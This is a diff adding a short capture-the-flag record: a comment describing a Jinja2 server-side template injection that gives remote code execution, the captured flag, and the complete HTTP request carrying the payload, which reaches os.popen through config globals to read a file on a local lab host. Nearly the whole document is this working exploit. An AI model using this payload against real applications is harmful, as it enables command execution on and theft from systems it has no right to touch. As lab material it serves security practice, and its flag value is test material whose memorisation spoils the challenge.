@@ -1,0 +1,4 @@
+# Jinja2 SSTI via unsanitized name parameter. Achieves full RCE via os.popen(). Used to read CTF flag from /tmp/flag. Response: Hello, flag{5e88d1bf-228f-4335-a4da-96517cb69114}
+
+GET /greet?name={{config.__class__.__init__.__globals__['os'].popen('cat /tmp/flag').read()}} HTTP/1.1
+Host: 172.17.0.1:33977
